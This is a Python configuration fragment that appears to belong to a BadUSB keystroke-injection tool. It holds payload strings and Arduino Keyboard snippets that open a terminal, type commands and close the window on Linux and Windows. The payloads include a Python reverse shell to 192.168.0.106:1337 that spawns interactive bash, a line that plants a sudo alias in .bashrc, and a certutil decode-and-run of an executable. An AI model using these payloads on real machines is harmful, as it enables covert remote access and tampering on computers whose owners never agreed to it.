
LINUX_PAYLOADS = {
    #"payload_bash": """ firefox &""",
    "firefox": """ firefox""",
    "pynetcat": """ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.106",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' &""",
    "sudo": """ echo "alias sudo='echo PWNED ; /usr/bin/sudo'" >> .bashrc""",
    "einar": """ echo "EinarGato" """,
    "dummy": """/* dummy payload */"""
    }

WINDOWS_PAYLOADS = {
    "firefox": """firefox""",
    "base64binfile": """ echo asdf > 1.txt; certutil -decode 1.txt 1.exe; 1.exe"""
    }

ALL_PAYLOADS = dict(list(LINUX_PAYLOADS.items()) + list(WINDOWS_PAYLOADS.items()))


OPEN_TERMINAL_METHODS = {
    "ctrlaltt": """
    Keyboard.press(KEY_LEFT_CTRL);  Keyboard.press(KEY_LEFT_ALT);  Keyboard.press('t');   Keyboard.releaseAll();  /* CTRL + SHIFT + T */
    """,
    "winrpowershell": """
    Keyboard.press(KEY_LEFT_GUI);  Keyboard.press('r');  Keyboard.releaseAll();  delay(300);
    Keyboard.print(F("powershell.exe"));  Keyboard.press(KEY_RETURN);  Keyboard.releaseAll(); delay(300);
    """,
    "winrcmd": """
    Keyboard.press(KEY_LEFT_GUI);  Keyboard.press('r');  Keyboard.releaseAll();  delay(300);
    Keyboard.print(F("cmd.exe"));  Keyboard.press(KEY_RETURN);  Keyboard.releaseAll(); delay(300);
    """,
    "dummy": """/* dummy open terminal method */"""
    #"specialkey":""
    }

KEY_RETURN = """
    Keyboard.press(KEY_RETURN); Keyboard.releaseAll(); /* ENTER */
    """

CLOSE_TERMINAL_METHODS = {
    "altf4": """
    Keyboard.press(KEY_LEFT_ALT);    Keyboard.press(KEY_F4);    Keyboard.releaseAll(); /* ALT F4 */
    """,
    "dummy": """/* dummy close terminal method */"""
    }

PREDEFINED_COMPILERS = {
    "promicro": "HoodLoader2:avr:HoodLoader2atmega32u4:board=leo"
}

        # if args.payloads == "nc":
        #     print("not implemented {}".format(args.payloads))
        # elif args.payloads == "firefox":
        #     payload_name = "firefox"
        # elif args.payloads == "firefoxwin":
        #     payload_name = "firefoxwin"
        # elif args.payloads == "pynetcat":
        #     payload_name = "pynetcat"
        # elif args.payloads == "pipeping":
        #     print("not implemented {}".format(args.payloads))
        # elif args.payloads == "windows":
        #     print("not implemented {}".format(args.payloads))
        # elif args.payloads == "sudopiping":
        #     print("not implemented {}".format(args.payloads))
        # elif args.payloads == "sudo":
        #     payload_name = "sudo"
        # elif args.payloads == "einar":
        #     payload_name = "einar"
        # elif args.payloads == "pwned":
        #     print("not implemented {}".format(args.payloads))
        # elif args.payloads == "pwnedfile":
        #     print("not implemented {}".format(args.payloads))
        